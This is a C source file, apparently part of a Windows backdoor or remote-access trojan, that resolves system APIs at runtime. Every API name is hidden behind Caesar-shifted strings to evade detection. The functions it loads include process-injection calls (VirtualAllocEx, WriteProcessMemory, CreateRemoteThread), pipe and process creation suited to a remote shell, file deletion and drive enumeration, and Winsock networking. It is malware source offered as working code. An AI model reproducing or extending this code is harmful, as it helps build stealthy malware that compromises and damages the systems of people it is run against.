#include "resolve_apis.h"
#include "libc.h"

API Api;
HMODULE hWininet;
HMODULE hKernel32;

void InitApis() {
	TLdrLoadDll ldr = (TLdrLoadDll)get_ntfunction(CAESAR_DECRYPT("QiwQtfiIqq"));
	TRtlInitUnicodeString r = (TRtlInitUnicodeString)get_ntfunction(CAESAR_DECRYPT("WyqNsnyZsnhtijXywnsl"));
	wchar_t *wide = L"kernel32.dll";
	UNICODE_STRING dll;

	r(&dll, wide);
	ldr(0, 0, &dll, (PVOID*)&hKernel32);
	if (!hKernel32) {
		return;
	}

	Api.GetProcAddress = (TGetProcAddress)my_GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyUwthFiiwjxx"));
	Api.LoadLibraryA = (TLoadLibraryA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("QtfiQngwfw~F"));
	Api.PeekNamedPipe = (TPeekNamedPipe)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("UjjpSfrjiUnuj"));
	Api.GetFileAttributesW = (TGetFileAttributesW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyKnqjFyywngzyjx\\"));
	Api.CreateRemoteThread = (TCreateRemoteThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjWjrtyjYmwjfi"));
	Api.CreateProcessA = (TCreateProcessA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUwthjxxF"));
	Api.CreateFileA = (TCreateFileA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqjF"));
	Api.HeapAlloc = (THeapAlloc)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuFqqth"));
	Api.HeapCreate = (THeapCreate)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuHwjfyj"));
	Api.HeapFree = (THeapFree)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuKwjj"));
	Api.HeapReAlloc = (THeapReAlloc)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuWjFqqth"));
	Api.CreateFileW = (TCreateFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqj\\"));
	Api.ReadFile = (TReadFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("WjfiKnqj"));
	Api.WriteFile = (TWriteFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjKnqj"));
	Api.CloseHandle = (TCloseHandle)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HqtxjMfsiqj"));
	Api.GetLastError = (TGetLastError)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyQfxyJwwtw"));
	Api.CreatePipe = (TCreatePipe)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUnuj"));
	Api.WaitForSingleObject = (TWaitForSingleObject)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\fnyKtwXnslqjTgojhy"));
	Api.Sleep = (TSleep)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Xqjju"));
	Api.CreateThread = (TCreateThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjYmwjfi"));
	Api.TerminateThread = (TTerminateThread)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("YjwrnsfyjYmwjfi"));
	Api.CreateProcessW = (TCreateProcessW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjUwthjxx\\"));
	Api.TerminateProcess = (TTerminateProcess)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("YjwrnsfyjUwthjxx"));
	Api.FindClose = (TFindClose)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiHqtxj"));
	Api.GetLogicalDrives = (TGetLogicalDrives)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyQtlnhfqIwn{jx"));
	Api.MultiByteToWideChar = (TMultiByteToWideChar)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("RzqynG~yjYt\\nijHmfw"));
	Api.FindFirstFileW = (TFindFirstFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiKnwxyKnqj\\"));
	Api.FindNextFileW = (TFindNextFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiSj}yKnqj\\"));
	Api.RemoveDirectoryW = (TRemoveDirectoryW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Wjrt{jInwjhytw~\\"));
	Api.DeleteFileW = (TDeleteFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("IjqjyjKnqj\\"));
	Api.DeleteFileA = (TDeleteFileA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("IjqjyjKnqjF"));
	Api.lstrcpyW = (TlstrcpyW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhu~\\"));
	Api.lstrcatW = (TlstrcatW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("qxywhfy\\"));
	Api.WriteProcessMemory = (TWriteProcessMemory)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjUwthjxxRjrtw~"));
	Api.VirtualAllocEx = (TVirtualAllocEx)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("[nwyzfqFqqthJ}"));

	hWininet = Api.LoadLibraryA(CAESAR_DECRYPT("|x7d873iqq"));
	if (!hWininet) {
		return;
	}

	Api.connect = (Tconnect)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("htssjhy"));
	Api.socket = (Tsocket)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xthpjy"));
	Api.send = (Tsend)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjsi"));
	Api.recv = (Trecv)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("wjh{"));
	Api.closesocket = (Tclosesocket)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("hqtxjxthpjy"));
	Api.htons = (Thtons)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("mytsx"));
	Api.inet_addr = (Tinet_addr)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("nsjydfiiw"));
	Api.WSAStartup = (TWSAStartup)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFXyfwyzu"));
	Api.WSAGetLastError = (TWSAGetLastError)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFLjyQfxyJwwtw"));
	Api.select = (Tselect)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjqjhy"));
	Api.setsockopt = (Tsetsockopt)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjyxthptuy"));
}